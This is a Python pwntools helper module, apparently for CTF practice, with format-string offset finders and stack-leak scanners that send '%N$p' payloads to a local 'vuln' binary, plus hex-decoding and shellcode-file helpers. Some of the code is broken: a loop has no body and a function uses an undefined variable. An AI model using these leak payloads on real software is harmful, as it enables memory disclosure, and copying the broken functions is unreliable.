from pwn import *
#? -----------------------------
#? Program sections for clasification
#? -----------------------------
VMMAP = [
    # ---- existing PIE / No-PIE 64-bit maps ----
    (0x555555554000, 0x555555555000, "r--p", "vuln"),
    (0x555555555000, 0x555555556000, "r-xp", "vuln"),
    (0x555555556000, 0x555555557000, "r--p", "vuln"),
    (0x555555557000, 0x555555558000, "r--p", "vuln"),
    (0x555555558000, 0x555555559000, "rw-p", "vuln"),
    (0x555555559000, 0x55555557a000, "rw-p", "[heap]"),

    (0x400000, 0x401000, "r--p", "vuln"),
    (0x401000, 0x402000, "r-xp", "vuln"),
    (0x402000, 0x403000, "r--p", "vuln"),
    (0x403000, 0x404000, "r--p", "vuln"),
    (0x404000, 0x405000, "rw-p", "vuln"),
    (0x405000, 0x426000, "rw-p", "[heap]"),

    (0x7ffff7dc2000, 0x7ffff7dc5000, "rw-p", "[anon]"),
    (0x7ffff7dc5000, 0x7ffff7deb000, "r--p", "libc.so.6"),
    (0x7ffff7deb000, 0x7ffff7f41000, "r-xp", "libc.so.6"),
    (0x7ffff7f41000, 0x7ffff7f94000, "r--p", "libc.so.6"),
    (0x7ffff7f94000, 0x7ffff7f98000, "r--p", "libc.so.6"),
    (0x7ffff7f98000, 0x7ffff7f9a000, "rw-p", "libc.so.6"),
    (0x7ffff7f9a000, 0x7ffff7fa7000, "rw-p", "[anon]"),
    (0x7ffff7fc2000, 0x7ffff7fc4000, "rw-p", "[anon]"),
    (0x7ffff7fc4000, 0x7ffff7fc8000, "r--p", "[vvar]"),
    (0x7ffff7fc8000, 0x7ffff7fca000, "r-xp", "[vdso]"),
    (0x7ffff7fca000, 0x7ffff7fcb000, "r--p", "ld-linux-x86-64.so.2"),
    (0x7ffff7fcb000, 0x7ffff7ff1000, "r-xp", "ld-linux-x86-64.so.2"),
    (0x7ffff7ff1000, 0x7ffff7ffb000, "r--p", "ld-linux-x86-64.so.2"),
    (0x7ffff7ffb000, 0x7ffff7ffd000, "r--p", "ld-linux-x86-64.so.2"),
    (0x7ffff7ffd000, 0x7ffff7fff000, "rw-p", "ld-linux-x86-64.so.2"),
    (0x7ffffffde000, 0x7ffffffff000, "rw-p", "[stack]"),

    # -------------------- 32-bit Regions Added --------------------
    (0x56555000, 0x56556000, "r-xp", "vuln"),
    (0x56556000, 0x56557000, "r--p", "vuln"),
    (0x56557000, 0x56558000, "rw-p", "vuln"),
    (0x56558000, 0x5657a000, "rw-p", "[heap]"),

    (0xf7d7d000, 0xf7d9f000, "r--p", "libc.so.6"),
    (0xf7d9f000, 0xf7f18000, "r-xp", "libc.so.6"),
    (0xf7f18000, 0xf7f98000, "r--p", "libc.so.6"),
    (0xf7f98000, 0xf7f9a000, "r--p", "libc.so.6"),
    (0xf7f9a000, 0xf7f9b000, "rw-p", "libc.so.6"),

    (0xf7f9b000, 0xf7fa5000, "rw-p", "[anon_f7f9b]"),
    (0xf7fc1000, 0xf7fc3000, "rw-p", "[anon_f7fc1]"),

    (0xf7fc3000, 0xf7fc7000, "r--p", "[vvar]"),
    (0xf7fc7000, 0xf7fc9000, "r-xp", "[vdso]"),

    (0xf7fc9000, 0xf7fca000, "r--p", "ld-linux.so.2"),
    (0xf7fca000, 0xf7fed000, "r-xp", "ld-linux.so.2"),
    (0xf7fed000, 0xf7ffb000, "r--p", "ld-linux.so.2"),
    (0xf7ffb000, 0xf7ffd000, "r--p", "ld-linux.so.2"),
    (0xf7ffd000, 0xf7ffe000, "rw-p", "ld-linux.so.2"),

    (0xfffdd000, 0xffffe000, "rw-p", "[stack]"),
]



#! ---------------------------- FMTSTR -----------------------------
 
 
 
#? -----------------------------
#? Color Module (ANSI escapes)
#? -----------------------------
class C:
    RESET = "\033[0m"
    BOLD  = "\033[1m"

    RED     = ERROR   = "\033[31m" # Errors
    GREEN   = SUCCESS = "\033[32m" # Success
    YELLOW  = WARNING = "\033[33m" # Warning
    BLUE    = INFO    = "\033[34m" # Info
    MAGENTA = DEBUG   = "\033[35m" # Debug
    CYAN    = DATA    = "\033[36m" # Data
    WHITE   = CLASSIC = "\033[37m"



#? ------------------------------------------------------------
#? classify_addr()
#?     Given an address and vmmap entries return:
#?         section_name, (start,end)
#? ------------------------------------------------------------
def classify_addr(addr: int, maps=VMMAP):
    for start, end, perm, obj in maps:
        if not (start <= addr < end):
            continue

        # Stack
        if "[stack]" in obj:
            return f"stack ({hex(start)} - {hex(end)})"

        # Heap
        if "[heap]" in obj:
            return f"heap ({hex(start)} - {hex(end)})"

        # VDSO/VVAR
        if "[vdso]" in obj:
            return f"vdso ({hex(start)} - {hex(end)})"
        if "[vvar]" in obj:
            return f"vvar ({hex(start)} - {hex(end)})"

        # Loader
        if obj.startswith("/lib") and "ld-" in obj:
            return f"ld ({hex(start)} - {hex(end)})"

        # Shared libs
        if obj.endswith(".so") or ".so." in obj or "/lib" in obj:
            return f"lib ({hex(start)} - {hex(end)})"

        # Main binary (anonymous but executable)
        if obj == "":
            if "x" in perm:
                return f".text ({hex(start)} - {hex(end)})"
            if "w" in perm:
                return f".data ({hex(start)} - {hex(end)})"
            return f"anon ({hex(start)} - {hex(end)})"

        # File-backed binary sections
        if perm.startswith("r-x"):
            return f".text ({hex(start)} - {hex(end)})"
        if "rw" in perm:
            return f".data ({hex(start)} - {hex(end)})"

        return f"file ({hex(start)} - {hex(end)})"

    return "unknown (None - None)"



#? ------------------------------------------------------------
#? process_leaks()
#?     Takes gs_lookup() results → classifies → computes offsets
#?     Dedup: only one entry per memory range
#? ------------------------------------------------------------
def process_leaks(results, maps=VMMAP, outfile="base_offset.txt"):
    seen_ranges = set()
    offsets = []

    for idx, leak, _ in results:
        # ignore <EOF>
        if leak.startswith(b"<"):
            continue

        # remove b"0x"
        try:
            ptr = int(leak, 16)
        except:
            continue

        # Added as a result of modificating of classify_addr()
        processing = (classify_addr(ptr, maps).replace('(', '').replace(')', '').replace('-', '').split(' '))
        del processing[2]
        #print(processing)

        if processing[1] == "None":
            continue
        
        processing[1] = int(processing[1], 16)
        processing[2] = int(processing[2], 16)
        #print(processing)

        section, start, end = processing

        # -----------

        #section, rng = classify_addr(ptr, maps)
        #if processing[1] == "None":
        #   continue

        # if this range was already processed, skip it
        if (start, end) in seen_ranges:
            continue

        # compute offset from section base
        offset = ptr - start

        # Mark as processed
        seen_ranges.add((start, end))

        # store sortable entry
        offsets.append((
            offset,
            ptr,
            section,
            idx,
            f"{hex(start)}-{hex(end)}"
        ))

    # Sort offsets (CHATGPTd This)
    offsets.sort(key=lambda x: x[0])

    # Write to file
    with open(outfile, "w") as f:
        for off, ptr, section, idx, rng in offsets:
            f.write(f"{hex(off)}  {hex(ptr)}  {section}  %{idx}$p  {rng}\n")

    return offsets


#? ------------------------------------------------------------
#? gfs_off()
#?     Finds the format-string offset where your test value
#?     (AAAA or AAAAAAAA) appears in memory.
#? ------------------------------------------------------------
def gfs_off(
    p_name: str = "./vuln",
    architecture: int = 64,
    start_line: bytes = b": \n",
    recv_line: bytes = b": ",
    lim: int = 50
) -> int:

    # Test pattern based on architecture size
    test: bytes = b"AAAAAAAA" if architecture == 64 else b"AAAA"
    f_spec: str = "$p" if architecture == 64 else "$x"

    with context.local(log_level="warn"):
        for i in range(lim + 1):
            try:
                tr = process(p_name)

                # Send format-string payload: AAAAAAAA%N$p
                tr.sendlineafter(start_line, test + f"%{i}{f_spec}".encode())

                # Skip up to marker
                tr.recvuntil(recv_line, timeout=0.2)

                # Receive the leaked line
                leak: bytes = tr.recvline(timeout=0.2)
                leaked_hex: bytes = leak.strip() if leak else b""

                tr.close()

                # If the known test pattern appears -> found the offset
                if test.hex().encode() in leaked_hex:
                    return i

            except EOFError:
                # Process crashed -> ignore and continue trying
                tr.close()
                continue

        return -1



#? ------------------------------------------------------------
#? gs_lookup()
#?     Prints all %N$p leaks from 0..lim.
#?     If 'lookup' is provided, passes leaks to hit_matcher().
#? ------------------------------------------------------------
# TODO Add support for multi_line
def gs_lookup(
    # regular inputs
    p_name: str = "./vuln",
    architecture: int = 64,
    start_line: bytes = b": \n",
    recv_line: bytes = b": ",

    # Scanning limits
    lim: int = 50,
    start: int = 1,
    spec: str = "",

    # Lookup and how many more to lookup afterwards
    lookup: bytes = b'',
    iter: int = 6,

    # In case program has multiple attack_vectors to scan
    multi_line: bool = False,
    multild: bytes = b"=",
    avectors: int = 2
    
) -> None:

    f_spec: str = spec if spec else ("$p" if architecture == 64 else "$x")
    results: list[tuple[int, bytes, str]] = []

    with context.local(log_level="warn"):
        for i in range(start, lim):
            try:
                if multi_line == False:

                    tr = process(p_name)

                    # Send %N$p format request
                    tr.sendlineafter(start_line, f"%{i}{f_spec}".encode().ljust(8, b'\x00'))
                    tr.recvuntil(recv_line, timeout=0.2)

                    # Capture the leak
                    leak = tr.recvline(timeout=0.2).strip()
                    tr.close()
                    # Debugging print(leak)
                    classification = "0x01" if b'nil' in leak else leak
                    results.append((i, leak, classify_addr(int(classification, 16))))
                else:
                    tr = process(p_name)
                    for i in range(avectors):

            except EOFError:
                tr.close()
                results.append((i, b"<EOF>"))
                continue

    # Print all stack leaks
    for idx, leak, region in results:
        print(f"{C.BLUE}position {idx}: {leak} -> {C.RESET}{C.WARNING}{region}{C.RESET}")

    # Perform lookup matching if requested
    if lookup != b'':
        hit_matcher(lookup, results, iter=iter)
    
    process_leaks(results)



#? ------------------------------------------------------------
#? hit_matcher()
#?     Attempts to match a byte sequence in stack leaks.
#?     Handles:
#?         - Big/little endian matching
#?         - Byte realignment (odd hex lengths)
#?         - Printing reconstructed ASCII interpretations
#? ------------------------------------------------------------
def hit_matcher(
    look: bytes = b"",
    results: list[tuple[int, bytes, str]] = [],
    direct: bool = False,
    direct_ls: list[bytes] = [],
    iter: int = 6
) -> None:

    # Big-endian and little-endian matching patterns
    lr: bytes = (look[::-1].hex()).encode()   # reversed/endian swapped
    l: bytes  = (look.hex()).encode()

    nxt: int = 0
    little_end: list[str] = []
    big_end: list[str] = []
    #* ------------------------------------------------------------
    #* Indirect mode → operates on scanned %N$p outputs
    #* ------------------------------------------------------------
    if direct == False:

        for idx, leak, _ in results:


            # Check if lookup appears in this leak
            if l in leak or lr in leak:
                print(f"{C.MAGENTA}[!] Hit for lookup bytes on{C.RESET} {C.CYAN}{idx}: {leak}{C.RESET}")
                nxt += 1
                print("{C.BLUE}[*] Attempting re-ordering including next 6...{C.RESET}")

            # Process next few values after finding a hit
            if 0 < nxt < iter:
                if b'nil' in leak:
                    continue

                store_ascii = gd_ascii(leak)

                print(f"{C.BLUE}[+] re-ordering {nxt}:{C.RESET} {C.CYAN}{store_ascii} | {store_ascii[::-1]}{C.RESET}")

                little_end.append(store_ascii[::-1])
                big_end.append(store_ascii)

                nxt += 1



    #*------------------------------------------------------------
    #* Direct mode → user-specified list of hex values
    #* ------------------------------------------------------------
    else:
        print(f"{C.MAGENTA}[*] Invoked direct call, attempting to parse list of bytes given...{C.RESET}")

        try:
            for add in direct_ls:
                nxt += 1 # counter

                store_ascii = gd_ascii(add)

                little_end.append(store_ascii[::-1])
                big_end.append(store_ascii)

        except Exception as e:
            print(f"{C.RED}Error occurred at hit_matcher: {e}{C.RESET}")
    # Output reconstructed interpretations
    print(f'\n{C.BLUE}If stack is little endian:{C.RESET} {C.CYAN}{"".join(little_end)}{C.RESET}')
    print(f'\n{C.BLUE}If stack is big endian:{C.RESET} {C.CYAN}{"".join(big_end)}{C.RESET}')


#? ------------------------------------------------------------
#? gfmts()
#?     Gives sequence of format specifiers separated by a delimeter
#? ------------------------------------------------------------

def gfmts(
    count: int,
    specifier: str = "p",
    delim: str = ""
) -> str:

    parts = [f"%{i}${specifier}" for i in range(1, count + 1)]
    return delim.join(parts)




#! ---------------------------- Heap -----------------------------

#? ------------------------------------------------------------
#? guaf_s()
#?     Gives the aligned size of allocation for use after free
#? ------------------------------------------------------------
#//def guaf_s() -> int:






#! ---------------------------- General -----------------------------






#? ------------------------------------------------------------
#? gshellc()
#?     Turns passed hex-encoded assembly into shellcode
#? ------------------------------------------------------------
# TODO: Take in pure assembly and convert it into shellcode
def gshellc(hexs: str):
    open('tl', 'wb').write(bytes.fromhex(hexs))











#? ------------------------------------------------------------
#? ghex_stream()
#?     Reads, sanitizes, and converst a continuous stream of bytes
#? ------------------------------------------------------------
#TODO FIX THIS ITS KINDA NOT WORKING FOR 32 BIT
def ghex_stream(hexstream: str, delim: str, end: str = 'LITTLE'):
    """
    Takes a long hex string (e.g., output from %n$x leaks),
    fixes odd-length alignment,
    splits into bytes,
    decodes ASCII for each byte,
    and returns both list and combined ASCII string.

    Returns:
        (list[str], str)
    """

    # -------------------------
    # Sanitize input
    # -------------------------
    hexstream = hexstream.replace("0x", "").replace("(nil)", "")   # remove all 0x
    hexstream = hexstream.strip()

    # -------------------------
    # Fix odd-length hex string
    # -------------------------
    hex_list = hexstream.split(delim)
    fixed_list = []
    for i in hex_list:

        i = gd_ascii(i.lower())
        if end.upper() == 'LITTLE':
            fixed_list.append(i[::-1])
        else:
            fixed_list.append(i)

    # Join to full ASCII string
    full_ascii = "".join(fixed_list)

    return full_ascii



#? ------------------------------------------------------------
#? gd_ascii():
#?     makes  sure character is ascii and ensure
#?     the prevention of lost data.
#?
#?     Fixes odd hex nibble count
#? ------------------------------------------------------------

#TODO FIX THIS TOO
def gd_ascii(lek: bytes | str) -> str:
    if isinstance(lek, bytes):
        lek.decode()
    store = lek[2:]      # drop '0x'
    slice_len = len(store) - 1

    # Fix odd number of hex digits by inserting '0'
    if len(store) % 2 != 0:
        store = store[:slice_len] + '0' + store[slice_len:]

    store_ascii = bytes.fromhex(store).decode('ASCII', errors='replace')
    return store_ascii





#? ------------------------------------------------------------
# // gfilter():
#?     WIP
#? ------------------------------------------------------------

def gfilter(values: list[tuple[int, bytes, str]]) -> list[tuple[int, bytes, str]]:

    scan: bytes = b'..'.join(values)

    for j in range(1, len(scan), 2):
        if scan == b'..':
            continue

        current = scan[j] + scan[j-1]

        try:
            current.decode('ascii')
        except:
            if j - 1 == 0: # [j:] inclusive?
                values = values[j+1:]
            values = values[:j-1] + values[i]





#? ------------------------------------------------------------
#? ghex_ascii()
#?     Turns passed hex int | str to ascii
#? ------------------------------------------------------------

#TODO FIX THIS 
def ghex_toAscii(
    conv: int | str,
    end: str = "BIG"
) -> str:

    if isinstance(conv, int):
       
        hexstr = hex(conv)[2:]

    else:  
        if conv.startswith("0x"):
            hexstr = conv.replace('0x', '').replace('(nil)', '')
            print(hexstr)
        else:
            hexstr = conv         

    try:
        converted = bytes.fromhex(hexstr).decode("ASCII", errors="replace")
    except Exception as e:
        cprint(f"Error: {e}", color='red')
        converted = ""  

    # -----------------------------
    # 3. Return based on endian
    # -----------------------------
    if end.upper() == "BIG":
        return converted
    else:
        return converted[::-1]

#? ------------------------------------------------------------
#? cprint()
#?     Prints text in cool colors (check C class at the top for options)
#? ------------------------------------------------------------

def cprint(
    text: str,
    color: str
) -> None:
    color = getattr(C, color.upper())
    reset = C.RESET
    print(f'{color}{text}{reset}')



#? ------------------------------------------------------------
#// gfms_pay()
#?     Tryna figure out how to do this
#? ------------------------------------------------------------

"""
def gfms_pay(
    off:int,
    writes: dict[int, int],
    already_written: int = 0,
    write_size: str = "short"
) -> bytes:
    return b''
    
    PLan to figure out how to do this
"""
